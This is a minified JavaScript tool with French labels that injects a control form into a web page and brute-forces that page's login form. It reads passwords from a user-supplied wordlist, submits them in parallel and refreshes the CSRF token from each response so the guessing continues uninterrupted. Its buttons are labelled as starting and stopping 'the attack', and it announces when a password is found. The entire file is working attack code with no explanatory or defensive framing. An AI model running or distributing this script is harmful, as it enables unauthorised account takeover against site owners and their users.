!function(){var e={};function t(e,t,n,a){var o=document.createElement("p"),s=document.createElement("label");s.for=n,s.textContent=e;var l=document.createElement("input");return l.id=n,l.name=n,l.type=t,void 0!==a&&(l.value=a),o.appendChild(s),o.appendChild(l),o}e.x=function(){if("undefined"!=typeof XMLHttpRequest)return new XMLHttpRequest;for(var e,t=["MSXML2.XmlHttp.6.0","MSXML2.XmlHttp.5.0","MSXML2.XmlHttp.4.0","MSXML2.XmlHttp.3.0","MSXML2.XmlHttp.2.0","Microsoft.XmlHttp"],n=0;n<t.length;n++)try{e=new ActiveXObject(t[n]);break}catch(e){}return e},e.send=function(t,n,a,o,s){void 0===s&&(s=!0);var l=e.x();l.open(a,t,s),l.onreadystatechange=function(){4==l.readyState&&n(l.responseText)},"POST"==a&&l.setRequestHeader("Content-type","application/x-www-form-urlencoded"),l.send(o)},e.get=function(t,n,a,o){var s=[];for(var l in n)s.push(encodeURIComponent(l)+"="+encodeURIComponent(n[l]));e.send(t+(s.length?"?"+s.join("&"):""),a,"GET",null,o)},e.post=function(t,n,a,o){var s=[];for(var l in n)s.push(encodeURIComponent(l)+"="+encodeURIComponent(n[l]));e.send(t,a,"POST",s.join("&"),o)};var n=document.createElement("form");document.body.appendChild(n),n.appendChild(t("Sélecteur du formulaire","text","form_selector")),n.appendChild(t("Liste de mots","file","word_list")),n.appendChild(t("Message attendu","text","displayed_message")),n.appendChild(t("Le message s'affiche en cas de succès","checkbox","on_success")),n.appendChild(t("Nom de la propriété token CSRF","text","csrf_token_key")),n.appendChild(t("Nom de la propriété password","text","password_key")),n.appendChild(t("Nombre de tentatives à la fois","number","speed",1)),n.appendChild(t("Démarrer","submit","start","Commencer l'attaque"));var a=document.createElement("button");a.id="stop",a.textContent="Arrêter l'attaque",n.appendChild(a);var o=document.createElement("p");n.appendChild(o);var s=!1,l={};n.addEventListener("submit",function(t){t.preventDefault(),s=!1;var n=document.querySelector(document.getElementById("form_selector").value),a=document.getElementById("word_list").files[0],r=document.getElementById("displayed_message").value,c=document.getElementById("csrf_token_key").value,d=document.getElementById("password_key").value,m=document.getElementById("speed").value,i=document.getElementById("on_success").checked;csrfToken=l[c]||null,l=function(e){if(e&&"FORM"===e.nodeName){var t,n,a={};for(t=e.elements.length-1;t>=0;t-=1)if(""!==e.elements[t].name)switch(e.elements[t].nodeName){case"INPUT":switch(e.elements[t].type){case"text":case"tel":case"email":case"hidden":case"password":case"button":case"reset":case"submit":a[e.elements[t].name]=e.elements[t].value;break;case"checkbox":case"radio":e.elements[t].checked&&(a[e.elements[t].name]=e.elements[t].value)}break;case"file":break;case"TEXTAREA":a[e.elements[t].name]=e.elements[t].value;break;case"SELECT":switch(e.elements[t].type){case"select-one":a[e.elements[t].name]=e.elements[t].value;break;case"select-multiple":for(n=e.elements[t].options.length-1;n>=0;n-=1)e.elements[t].options[n].selected&&(a[e.elements[t].name]=e.elements[t].options[n].value)}break;case"BUTTON":switch(e.elements[t].type){case"reset":case"submit":case"button":a[e.elements[t].name]=e.elements[t].value}}return a}}(n),csrfToken&&(l[c]=csrfToken);var u=new FileReader;u.onload=function(){o.textContent="Searching...";var t=u.result.split("\n"),a=n.action||"";a=a.replace(/#/,"");for(var p=0,f=function(){o.textContent="Looking for "+p+" over "+t.length;var m=t[p++].trim();l[d]=m;var u=function(e){if(!s)if(i?e.match(r):!e.match(r))o.textContent="Password found : "+m,s=!0;else{var t=document.createElement("div");t.innerHTML=e.replace(/^[\s\S]*<body.*?>|<\/body>[\s\S]*$/gi,"");var n=t.querySelector('[name="'+c+'"]');n&&(tokenValue=n.value,l[c]=tokenValue),f()}};"get"===n.method.toLowerCase()?e.get(a,l,u):e.post(a,l,u)},v=0;v<m;v++)f()},u.readAsText(a)}),a.addEventListener("click",function(e){e.preventDefault(),s=!0})}();
